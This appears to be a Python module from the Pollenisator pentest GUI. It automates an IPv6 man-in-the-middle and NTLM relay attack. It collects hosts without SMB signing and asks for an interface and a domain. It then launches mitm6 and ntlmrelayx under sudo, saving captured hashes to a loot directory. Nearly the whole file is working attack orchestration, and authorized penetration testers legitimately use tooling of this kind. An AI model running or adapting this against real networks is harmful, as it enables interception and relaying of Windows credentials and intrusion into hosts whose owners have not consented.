import subprocess
import pollenisatorgui.core.components.utils as utils
import os
from pollenisatorgui.core.components.apiclient import APIClient
import psutil

from pollenisatorgui.scripts.lan.utils import ask_text, checkPath, getNICs


def main(apiclient, appli, **kwargs):
    res, path = checkPath(["mitm6", "mitm6.py"])
    if not res:
        return False, path
    res, path = checkPath(["ntlmrelayx", "ntlmrelayx.py"])
    if not res:
        return False, path
    APIClient.setInstance(apiclient)
    smb_signing_list = apiclient.find("computers", {"infos.signing":"False"}, True)
    export_dir = utils.getExportDir()
    file_name = os.path.join(export_dir, "relay_list.lst")
    domains = set()
    liste = []
    with open(file_name, "w") as f:
        for computer in smb_signing_list:
            ip = computer.get("ip", "")
            domain = computer.get("domain", "")
            if domain.strip() != "":
                domains.add(domain)

            if ip != "":
                liste.append(ip)
                f.write(ip+"\n")
    domains = list(domains)
    if len(liste) == 0:
        return False, "No relayable host found yet"
    relaying_loot_path = os.path.join(export_dir, "loot_relay")
    try:
        os.makedirs(relaying_loot_path)
    except:
        pass
    relaying_loot_path = os.path.join(relaying_loot_path, "hashes-mitm6.log")
    device = getNICs(appli is not None)
    if device is None:
        return False, "No device selected"
    domain = ""
    if len(domains) == 0:
        domain = ask_text(appli is not None, "No domain found, enter domain name :", "")
    elif len(domains) == 1:
        domain = domains[0]
    else:
        if appli:
            from pollenisatorgui.core.application.dialogs.ChildDialogCombo import ChildDialogCombo
            
            dialog = ChildDialogCombo(None, domains, displayMsg="Choose target domain")
            dialog.app.wait_window(dialog.app)
            domain = dialog.rvalue
        else:
            print("Choose target domain")
            for i, domainitem in enumerate(domains):
                print(str(i+1)+". "+domainitem)
            domain = input("Choose target domain (type its number):")
            try:
                domain = domains[int(domain)-1]
            except ValueError:
                return False, "Wrong number given"
    if domain is None or domain == "":
        return False, "No domain choosen"
    addrs = psutil.net_if_addrs()
    address = addrs[device][0].address
    cmd = f"mitm6 -i {device} -d {domain}"
    if os.geteuid() != 0:
        cmd = "sudo "+cmd
    mitm6 = None
    if appli:
        appli.launch_in_terminal(kwargs.get("default_target",None), "mitm6", f"{cmd}", use_pollex=False)
    else:
        mitm6 = subprocess.Popen(cmd, shell=True)
    cmd = f"{path} -tf {file_name} -6 -wh {address} -of {relaying_loot_path}/"
    if os.geteuid() != 0:
        cmd = "sudo "+cmd
    if appli:
        appli.launch_in_terminal(kwargs.get("default_target",None), "ntlmrelayx for mitm6", f"{cmd}", use_pollex=False)
    else:
        subprocess.run(cmd, shell=True)
    if mitm6:
        mitm6.terminate()
    
    return True, f"Listening ntlmrelayx with mittm6 opened, loot directory is here:"+str(relaying_loot_path)+"\n"
    
